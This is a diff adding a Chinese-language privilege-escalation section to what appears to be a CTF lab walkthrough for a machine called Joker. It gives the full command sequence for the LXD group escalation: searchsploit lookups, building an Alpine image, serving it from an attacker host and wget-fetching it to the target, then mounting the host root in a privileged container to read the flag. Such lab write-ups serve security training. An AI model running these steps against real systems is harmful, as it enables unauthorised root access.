@@ -229,3 +229,75 @@ joomla/joomla
 
 
 
+
+
+### 4. 提权
+
+```shell
+# 获取到shell后
+# 查看版本
+cat /etc/*release
+
+NAME="Ubuntu"
+VERSION="18.04.3 LTS (Bionic Beaver)"
+
+# id lxd提权漏洞
+uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
+
+# 搜索exp
+searchsploit Ubuntu 18.04
+
+# 查看信息
+searchsploit -p 46978 
+
+# 详细信息 
+cat /usr/share/exploitdb/exploits/linux/local/46978.sh
+
+# Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
+# Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
+# Step 3: Run this script and you will get root [Victim Machine]
+# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine
+
+git clone https://github.com/saghul/lxd-alpine-builder.git
+
+#执行安装
+sudo bash ./build-alpine
+
+# 开启服务
+python3 -m http.server 8000
+
+# 进入shell 下载到靶机
+wget 172.16.168.128:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+
+# 安装
+lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite myimage disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+# root 获取到权限了
+
+cat /mnt/root/root/final.txt
+
+
+     ██╗ ██████╗ ██╗  ██╗███████╗██████╗ 
+     ██║██╔═══██╗██║ ██╔╝██╔════╝██╔══██╗
+     ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██   ██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+╚█████╔╝╚██████╔╝██║  ██╗███████╗██║  ██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                         
+!! Congrats you have finished this task !!
+
+Contact us here:
+
+Hacking Articles : https://twitter.com/rajchandel/
+Aarti Singh: https://in.linkedin.com/in/aarti-singh-353698114
+
++-+-+-+-+-+ +-+-+-+-+-+-+-+
+ |E|n|j|o|y| |H|A|C|K|I|N|G|
+ +-+-+-+-+-+ +-+-+-+-+-+-+-+
+
+```
+
